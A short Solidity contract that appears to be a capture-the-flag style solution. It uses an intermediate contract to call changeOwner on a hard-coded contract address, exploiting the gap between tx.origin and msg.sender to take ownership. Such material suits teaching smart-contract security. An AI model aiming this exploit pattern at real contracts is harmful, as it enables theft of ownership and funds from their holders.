//SPDX-License-Identifier: MIT

pragma solidity 0.6.0;

contract TelephoneCaller {
  address telephone = 0x718641302521f8E0ca6285e40Caa021df455B28b;

  function callTelephone() public returns (bool success) {
    (success, ) = telephone.call(
      abi.encodeWithSignature("changeOwner(address)", msg.sender)
    );
    require(success, "Could not call.");
  }
}